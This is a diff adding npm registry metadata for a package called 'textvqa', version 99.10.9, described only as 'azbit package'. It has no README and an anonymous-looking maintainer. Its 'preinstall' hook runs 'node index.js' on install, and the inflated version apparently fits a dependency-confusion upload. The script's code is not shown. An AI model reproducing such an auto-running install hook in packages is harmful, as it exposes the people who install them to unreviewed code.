@@ -1,0 +1,62 @@
+{
+    "_id": "textvqa",
+    "name": "textvqa",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "textvqa",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "textvqa@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-A/pQzFKL7BcC/K1F2mjw7MbX3mUjvYSs6+JpjWGMSgwtk76e+/1DFrBkz5Rn7CIC7lc5muxromVvCqta7FtAtQ==",
+                "shasum": "20285f7c6c0f429375bc034325a31d9efc0e02cc",
+                "tarball": "https://registry.npmjs.org/textvqa/-/textvqa-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5059,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJBHACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmq7cxAAoAfqbmalZFW6ZLp9b8fnOGQxuWh1dXL3kMQI59r2YrpPOCW1\r\n8UDvZMMpTrD4msF4VSJN6kWsV8flwhvwOiygnarNLsnZX4njpx6lYIP9POjY\r\nnllpGQUi95es7gyT1+JKB5+HAvhNyhmb/qhrSPmXof4iawWrAw/eNwT+EOTZ\r\niE0tI2GAfWZhOmoUR/tKzu3DgbEgzF+JXdOSoRkfIFk3sAylaGIU0wNS9Bix\r\n9rmKhpi3jRyqUXW6ct9jLOgPMM8547cQOr/CGfrOgeg8zh3BWeRZPwIuhcuf\r\npwY63G3CDS52yrOZnLI3IvGXKlZFKaGMK85MTUUcUHD3pwEi4PY3ueQh+juU\r\nEpiAywBPi9yOYPNlX2EPb9UccFX35/bEYCkzvpPX40DwNWua1ExnEUh3ZDq7\r\n/2S9q6KMk9ncoqBrK4gxYTqbXY93/76bNRi1WzC1EuVdGtZydAatEzTfxRfB\r\nElTgQmbrCszmxtHyNCP+mroMstwTBCkCg/H6wOYYcxgVQ4u7wcpp6WwpX5oi\r\nLaAJCM42Ue35WBNCWg9MckTfOR+2aB1wu/x06nn0APKU0ZdDVXb8UPB9vgBw\r\nfvtcJOyxh6IqD30kgEgNHhvi87HJ828UaRuygEBCHjyXJOY3xn4W0t3oR2Fl\r\nXLQ6a9wEm084ITolI5lw7IvTO8XYSavtJME=\r\n=hzUg\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ujj6dg4z",
+                "email": "ujj6dg4z@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ujj6dg4z",
+                    "email": "ujj6dg4z@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/textvqa_99.10.9_1648136263590_0.7284751980021431"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T15:37:43.589Z",
+        "99.10.9": "2022-03-24T15:37:43.750Z",
+        "modified": "2022-03-24T15:37:43.838Z"
+    },
+    "maintainers": [
+        {
+            "name": "ujj6dg4z",
+            "email": "ujj6dg4z@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
